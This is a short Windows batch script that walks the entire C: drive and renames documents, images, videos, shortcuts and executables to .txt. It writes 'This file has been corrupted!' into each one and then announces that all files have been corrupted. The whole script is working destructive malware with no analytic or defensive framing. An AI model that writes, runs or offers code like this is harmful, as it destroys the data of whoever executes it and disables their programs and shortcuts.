@echo off
setlocal enableextensions

pushd C:\

for /r %%i in (*.doc *.xml *.gif *.jpeg *.lnk *.avi *.mpeg *.com *.bat) do (
  ren "%%i" "%%~ni.txt"
  echo This file has been corrupted! >> "%%~ni.txt"
)

echo All files have been corrupted.

popd
